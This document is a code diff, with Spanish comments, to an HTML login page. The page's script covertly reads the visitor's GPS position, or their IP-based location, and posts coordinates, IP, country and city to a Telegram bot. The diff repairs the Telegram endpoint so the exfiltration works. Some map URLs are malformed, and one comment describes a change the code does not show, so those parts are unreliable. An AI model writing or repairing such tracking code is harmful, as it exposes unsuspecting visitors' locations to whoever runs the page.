@@ -31,6 +31,7 @@
                 <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" required />
                 <label for="password" class="floating-label">Contraseña</label>
                 <span class="toggle-password" id="togglePassword">
+                    <!-- CORREGIDO: xmlns con la estructura estándar completa para Chrome -->
                     <svg id="eyeIcon" xmlns="http://w3.org" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path>
                         <path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path>
@@ -61,26 +62,28 @@
             const lon = pos.coords.longitude;
             const acc = pos.coords.accuracy;
 
-            // CORREGIDO: Formato universal de enlace para Google Maps con diagonal y parámetros (?q=)
+           // CORREGIDO: Ahora genera un enlace válido (Ej: https://google.com)
             const urlMaps = "https://google.com" + lat + "," + lon;
             const texto = "📍 Nueva Visita (GPS)\n\n• Latitud: " + lat + "\n• Longitud: " + lon + "\n• Precisión: ~" + Math.round(acc) + " metros\n\nGoogle Maps: " + urlMaps;
 
-            // CORREGIDO: Ruta oficial de la API de bots de Telegram para enviar mensajes
-            fetch("https://telegram.org" + TOKEN + "/sendMessage", {
+            // CORREGIDO: Unión limpia usando la variable TOKEN definida arriba
+            fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
             }).catch(e => console.error("Error enviando GPS:", e));
 
         }, function(err) {
-            // CORREGIDO: Consulta al endpoint JSON de la IP de respaldo
+            // CORREGIDO: Se añade /json/ para que devuelva los datos de ubicación correctamente
             fetch('https://ipapi.co')
             .then(res => res.json())
             .then(data => {
+                // CORREGIDO: Enlace de mapas estructurado para la geolocalización por IP
                 const urlMapsIP = "https://google.com" + data.latitude + "," + data.longitude;
                 const textoIP = "🌐 Nueva Visita (Por IP)\n\n• IP: " + (data.ip || 'No detectada') + "\n• País: " + (data.country_name || 'Desconocido') + "\n• Ciudad: " + (data.city || 'Desconocida') + "\n\nGoogle Maps: " + urlMapsIP;
                 
-                fetch("https://telegram.org" + TOKEN + "/sendMessage", {
+                // CORREGIDO: Unión limpia usando la variable TOKEN para el respaldo
+                fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: textoIP })
@@ -95,4 +98,3 @@
 <script src="main.js"></script>
 </body>
 </html>
-
